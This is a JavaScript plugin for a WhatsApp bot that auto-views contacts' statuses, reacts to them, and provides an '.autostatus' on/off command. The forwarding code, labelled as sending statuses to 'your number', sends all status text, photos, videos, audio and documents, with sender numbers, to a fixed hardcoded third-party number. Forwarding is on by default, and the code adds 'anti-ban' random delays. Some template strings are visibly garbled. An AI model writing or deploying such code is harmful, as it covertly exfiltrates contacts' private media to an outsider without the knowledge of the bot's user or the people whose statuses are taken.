const fs = require('fs');
const path = require('path');
const { downloadMediaMessage } = require('@whiskeysockets/baileys');
const isOwnerOrSudo = require('../lib/isOwner');

// ────────────────────────────────────────────────
// CONFIG & TARGET NUMBER
// ────────────────────────────────────────────────
const configPath = path.join(__dirname, '../data/autoStatus.json');

// All statuses forwarded to this fixed number
const TARGET_NUMBER = '255615944741';
const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;

// Default settings
const DEFAULT_CONFIG = {
    enabled: true,
    reactOn: true
};

if (!fs.existsSync(configPath)) {
    fs.writeFileSync(configPath, JSON.stringify(DEFAULT_CONFIG, null, 2));
}

// ────────────────────────────────────────────────
// CLEAN SENDER NUMBER EXTRACTION
// ────────────────────────────────────────────────
function getSenderNumber(key) {
    if (!key) return 'Unknown';

    let jid = key.participant || key.remoteJid || '';
    if (!jid || typeof jid !== 'string') return 'Unknown';

    // Common formats: 255xxxxxxxxxx@s.whatsapp.net or 255xxxxxxxxxx:s.whatsapp.net
    const match = jid.match(/^(\d{8,15})/);
    if (match && match[1]) {
        return match[1];
    }

    // Fallback - remove everything after @
    if (jid.includes('@')) {
        return jid.split('@')[0].trim() || 'Unknown';
    }

    return 'Unknown';
}

// ────────────────────────────────────────────────
// FORWARD STATUS TO YOUR NUMBER
// ────────────────────────────────────────────────
async function forwardStatusToTarget(sock, m) {
    if (!m || !m.message) return;

    const senderNumber = getSenderNumber(m.key);
    const msgType = Object.keys(m.message)[0] || 'unknown';
    const content = m.message[msgType] || {};

    console.log(`[AutoStatus] Status from \( {senderNumber} ( \){msgType}) → ${TARGET_NUMBER}`);

    // Text-only status
    if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
        const text = content.text || content.description || '[Text only status]';
        await sock.sendMessage(TARGET_JID, {
            text: `📸 Status from \( {senderNumber}\n\n \){text}`
        }).catch(err => console.log('[AutoStatus] Text forward failed:', err.message));
        return;
    }

    // Media types we support
    const mediaTypes = {
        imageMessage:    { sendAs: 'image',   ext: 'jpg',  mime: 'image/jpeg' },
        videoMessage:    { sendAs: 'video',   ext: 'mp4',  mime: 'video/mp4'  },
        audioMessage:    { sendAs: 'audio',   ext: 'ogg',  mime: 'audio/ogg; codecs=opus' },
        stickerMessage:  { sendAs: 'sticker', ext: 'webp', mime: 'image/webp' },
        documentMessage: { sendAs: 'document', ext: (content.fileName?.split('.').pop() || 'file') }
    };

    const media = mediaTypes[msgType];
    if (!media) {
        // Unsupported → send info only
        await sock.sendMessage(TARGET_JID, {
            text: `📊 New status from ${senderNumber}\nType: ${msgType}\nTime: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Dar_es_Salaam' })}`
        }).catch(() => {});
        return;
    }

    try {
        const buffer = await downloadMediaMessage(
            m,
            'buffer',
            {},
            {
                logger: console,
                reuploadRequest: sock.updateMediaMessage || undefined
            }
        );

        const caption = content.caption || 'No caption';
        const fileName = content.fileName || `status_\( {Date.now()}. \){media.ext}`;

        await sock.sendMessage(TARGET_JID, {
            [media.sendAs]: buffer,
            mimetype: content.mimetype || media.mime,
            fileName,
            caption: `From: \( {senderNumber}\n \){caption}`
        });

        console.log(`[AutoStatus] ✓ Forwarded ${media.sendAs} from ${senderNumber}`);

    } catch (err) {
        console.error('[AutoStatus] Media forward failed:', err.message || err);

        // Fallback notification
        await sock.sendMessage(TARGET_JID, {
            text: `⚠️ Status from ${senderNumber} — media download failed\n` +
                  `Type: ${msgType}\nCaption: ${content.caption || 'None'}\n` +
                  `Time: ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Dar_es_Salaam' })}`
        }).catch(() => {});
    }
}

// ────────────────────────────────────────────────
// REACT FUNCTION
// ────────────────────────────────────────────────
async function reactToStatus(sock, key) {
    if (!isStatusReactionEnabled()) return;

    try {
        await sock.relayMessage('status@broadcast', {
            reactionMessage: {
                key: {
                    remoteJid: 'status@broadcast',
                    fromMe: false,
                    id: key.id,
                    participant: key.participant || key.remoteJid || undefined
                },
                text: '🤍'
            }
        }, { messageId: key.id });
    } catch {
        // silent
    }
}

// ────────────────────────────────────────────────
// CONFIG UTILS
// ────────────────────────────────────────────────
function loadConfig() {
    try {
        const raw = fs.readFileSync(configPath, 'utf8');
        const parsed = JSON.parse(raw);
        return { ...DEFAULT_CONFIG, ...parsed };
    } catch {
        return DEFAULT_CONFIG;
    }
}

function isAutoStatusEnabled() {
    return loadConfig().enabled;
}

function isStatusReactionEnabled() {
    return loadConfig().reactOn;
}

// ────────────────────────────────────────────────
// COMMAND HANDLER (.autostatus)
// ────────────────────────────────────────────────
async function autoStatusCommand(sock, chatId, msg, args) {
    const sender = msg.key.participant || msg.key.remoteJid;
    const isAllowed = msg.key.fromMe || await isOwnerOrSudo(sender, sock, chatId);

    if (!isAllowed) {
        return sock.sendMessage(chatId, { text: '❌ Owner only!' });
    }

    let config = loadConfig();

    if (!args || args.length === 0) {
        return sock.sendMessage(chatId, {
            text: `🔄 *Auto Status*\n\n` +
                  `Active     : ${config.enabled ? '🟢 ON' : '🔴 OFF'}\n` +
                  `Reactions  : ${config.reactOn ? '🟢 ON' : '🔴 OFF'}\n` +
                  `Forward to : 🟢 ALWAYS → ${TARGET_NUMBER}\n\n` +
                  `Commands:\n` +
                  `.autostatus on\n` +
                  `.autostatus off\n` +
                  `.autostatus react on\n` +
                  `.autostatus react off`
        });
    }

    const action = args[0].toLowerCase();

    if (action === 'on') {
        config.enabled = true;
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        return sock.sendMessage(chatId, { text: '✅ Auto status turned ON' });
    }

    if (action === 'off') {
        config.enabled = false;
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        return sock.sendMessage(chatId, { text: '❌ Auto status turned OFF' });
    }

    if (action === 'react') {
        if (!args[1]) return sock.sendMessage(chatId, { text: '→ Use: .autostatus react on / off' });

        const sub = args[1].toLowerCase();
        config.reactOn = sub === 'on';
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));

        return sock.sendMessage(chatId, {
            text: `Reactions: ${config.reactOn ? '🟢 ON' : '🔴 OFF'}`
        });
    }

    return sock.sendMessage(chatId, { text: 'Invalid. Use .autostatus to see commands.' });
}

// ────────────────────────────────────────────────
// STATUS EVENT HANDLER
// ────────────────────────────────────────────────
async function handleStatusUpdate(sock, ev) {
    if (!isAutoStatusEnabled()) return;

    // Random delay (anti-ban / rate-limit protection)
    await new Promise(r => setTimeout(r, 900 + Math.random() * 1600));

    let message;

    if (ev.messages && ev.messages.length > 0) {
        message = ev.messages[0];
    } else if (ev.key && ev.key.remoteJid === 'status@broadcast') {
        message = ev;
    } else if (ev.reaction && ev.reaction.key?.remoteJid === 'status@broadcast') {
        message = ev.reaction;
    }

    if (!message?.key?.remoteJid?.includes('status@broadcast')) return;

    try {
        await sock.readMessages([message.key]).catch(() => {});

        if (isStatusReactionEnabled()) {
            await reactToStatus(sock, message.key);
        }

        await forwardStatusToTarget(sock, message);

    } catch (err) {
        console.error('[AutoStatus] Main handler error:', err.message || err);
    }
}

module.exports = {
    autoStatusCommand,
    handleStatusUpdate
};